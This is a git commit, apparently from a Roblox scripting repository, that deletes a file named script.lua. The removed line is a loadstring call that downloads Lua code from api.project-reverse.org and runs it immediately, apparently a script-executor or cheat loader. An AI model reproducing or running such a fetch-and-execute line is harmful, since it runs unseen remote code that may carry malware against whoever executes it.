bc61615944e5a16bcd5a528eb9db1036d5f8c00e
Tokiamur <aporhyaunpai@gmail.com>
2026-06-17 19:51:42 +0300

    Delete script.lua

--- script.lua
+++
@@ -1,1 +0,0 @@
-loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjAwNGFkODZkLTFmNGMtNDZiZS1iZWQ1LWYxOTUyZjAxZTFjYSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJnYWcyX21haW5fdmlzdWFsIn19"))()
